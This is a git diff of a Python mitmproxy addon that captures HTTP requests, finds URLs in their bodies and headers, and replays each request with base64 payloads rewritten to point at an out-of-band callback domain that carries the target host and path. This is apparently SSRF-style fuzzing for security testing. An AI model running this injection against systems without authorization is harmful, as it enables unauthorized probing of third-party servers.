@@ -8,6 +8,8 @@ import hashlib
 from typing import BinaryIO
 import logging
 import base64
+#import aiohttp
+import asyncio
 
 """Take incoming HTTP requests and replay them with modified parameters."""
 from mitmproxy import ctx, io, http
@@ -36,7 +38,7 @@ class Writer:
     def done(self):
         self.f.close()
 
-    def request( self, flow: http.HTTPFlow ) -> None:
+    async def request( self, flow: http.HTTPFlow ) -> None:
         # Avoid an infinite loop by not replaying already replayed requests
         if flow.is_replay == "request":
             return
@@ -44,50 +46,39 @@ class Writer:
         url_for_payloads = search_for_url(flow_copy)
         if url_for_payloads:
             logging.warning(url_for_payloads)
-
-        # Only interactive tools have a view. If we have one, add a duplicate entry
-        # for our flow_copy.
             for pl in base_payloads:
-                flow_copy = flow.copy()
-                self.w.add(flow_copy)
-                dpl = base64.b64decode(pl)
-                this_telequery = f"{url_for_payloads['netloc']}.urlfuzz.telescopiceye.mooo.com/?urlfuzz={url_for_payloads['netloc']}{url_for_payloads['path']}"
-                byte_query = bytes(this_telequery,'utf-8')
-                new_pl = dpl.replace(b"n.pr", bytes( url_for_payloads['netloc'], 'utf-8' ))
-                new_pl = new_pl.replace(b"aa-ver45.co.uk",byte_query)
-                other_pl = dpl.replace(b"aa-ver45.co.uk", bytes( url_for_payloads['netloc'], 'utf-8' ))
-                other_pl = other_pl.replace(b"n.pr", byte_query)
-                this_content_a = url_for_payloads['modified_flow'].replace(b"URLFUZZ",new_pl)
-                this_content_b = url_for_payloads['modified_flow'].replace(b"URLFUZZ",other_pl)
-                flow_copy.request.content = this_content_a
-                if "view" in ctx.master.addons:
-                    ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
-                ctx.master.commands.call("replay.client", [flow_copy])
-                flow_copy = flow.copy()
-                flow_copy.request.content = this_content_b
-                if "view" in ctx.master.addons:
-                    ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
-                ctx.master.commands.call("replay.client", [flow_copy])
-        
+                await replay_modified_payload( flow_copy , url_for_payloads, pl, self.w )
+
 def search_for_url(flow):
     # Define the regular expression pattern for a URL
     url_pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
-    request_headers = urllib.parse.unquote(flow.request.headers)
+    request_headers = flow.request.headers.fields
     request_content = urllib.parse.unquote(flow.request.content)
     
     # Try to find all URLs within the request headers and content
-    matches = re.search(url_pattern, request_content)
+    content_matches = re.findall(url_pattern, request_content)
+    header_matches = []
+    for header in request_headers:
+        #header[1] is presumed to be the header value, header[0] the header name
+        this_matches = re.findall(url_pattern, urllib.parse.unquote(header[1]))
+        if this_matches:
+            header_matches.extend(this_matches)
+            
+    matches = []
     
-    if matches:
-        content_to_file = request_content
+    if content_matches:
+        modified_content = request_content
+        matches.extend(content_matches)
+    if header_matches:
+        modified_headers = request_headers
+        matches.extend(header_matches)
         for match in matches:
-            url_expr = match.string[match.start():]
+            url_expr = match
             for char in url_expr:
                 if char in ['"','}']:
                     url_expr = url_expr.replace(char, ' ')
             extracted_url = url_expr.split()[0]
             print(f"extracted_url: {extracted_url}")
-            print(f"match.groups(): {match.groups()}")
            
             # Extract all parameters from the parameters string
             url_dict = dict()
@@ -148,13 +139,64 @@ def search_for_url(flow):
             url_dict['params_dict'] = params_dict
 
             url_bytes = bytes(url_literal, 'utf-8')
-            content_to_file = content_to_file.replace(url_literal, "URLFUZZ")
-        url_dict['modified_flow'] = bytes(content_to_file, 'utf-8')
+            if content_matches:
+                modified_content = modified_content.replace(url_literal, "URLFUZZ")
+            if header_matches:
+                tmp_headers = []
+                for header in modified_headers:
+                    inner_tmp = []
+                    inner_tmp.append(header[0])
+                    if header[0] != b"Host":
+                        inner_tmp.append(header[1].replace(bytes(url_literal,'utf-8'), b"URLFUZZ"))
+                    else:
+                        inner_tmp.append(header[1])
+                    tmp_headers.append(inner_tmp)
+                modified_headers = tmp_headers
+        if content_matches:
+            url_dict['modified_content'] = bytes(modified_content, 'utf-8')
+        if header_matches:
+            url_dict['modified_headers'] = modified_headers
 
         return url_dict
     else:
         # If the input doesn't contain a URL, return None
         return None
+
+async def replay_modified_payload( flow: http.HTTPFlow , url_for_payloads, pl , plug_writer: io.FlowWriter ) -> None:
+
+        flow_copy = flow.copy()
+        plug_writer.add(flow_copy)
+        dpl = base64.b64decode(pl)
+        this_telequery = f"{url_for_payloads['netloc']}.urlfuzz.telescopiceye.mooo.com/?urlfuzz={url_for_payloads['netloc']}{url_for_payloads['path']}"
+        byte_query = bytes(this_telequery,'utf-8')
+        new_pl = dpl.replace(b"n.pr", bytes( url_for_payloads['netloc'], 'utf-8' ))
+        new_pl = new_pl.replace(b"aa-ver45.co.uk",byte_query)
+        other_pl = dpl.replace(b"aa-ver45.co.uk", bytes( url_for_payloads['netloc'], 'utf-8' ))
+        other_pl = other_pl.replace(b"n.pr", byte_query)
+        if 'modified_content' in url_for_payloads.keys():
+            this_content_a = url_for_payloads['modified_content'].replace(b"URLFUZZ",new_pl)
+            this_content_b = url_for_payloads['modified_content'].replace(b"URLFUZZ",other_pl)
+        if 'modified_headers' in url_for_payloads.keys():
+            this_headers_a = []
+            this_headers_b = []
+            for hdr in url_for_payloads['modified_headers']:
+                this_headers_a.append(( hdr[0], hdr[1].replace(b"URLFUZZ",new_pl)))
+                this_headers_b.append(( hdr[0], hdr[1].replace(b"URLFUZZ",other_pl)))
+        if 'modified_content' in url_for_payloads.keys():
+            flow_copy.request.content = this_content_a
+        if 'modified_headers' in url_for_payloads.keys():
+            flow_copy.request.headers = http.Headers(this_headers_a)
+        if "view" in ctx.master.addons:
+            ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
+        ctx.master.commands.call("replay.client", [flow_copy])
+        flow_copy = flow.copy()
+        if 'modified_content' in url_for_payloads.keys():
+            flow_copy.request.content = this_content_b
+        if 'modified_headers' in url_for_payloads.keys():
+            flow_copy.request.headers = http.Headers(this_headers_b)
+        if "view" in ctx.master.addons:
+            ctx.master.commands.call("view.flows.duplicate",[flow_copy] )
+        ctx.master.commands.call("replay.client", [flow_copy])
 
 def make_filename_from_path( netloc , path ):
     replaced_netloc = netloc.replace(".","-")
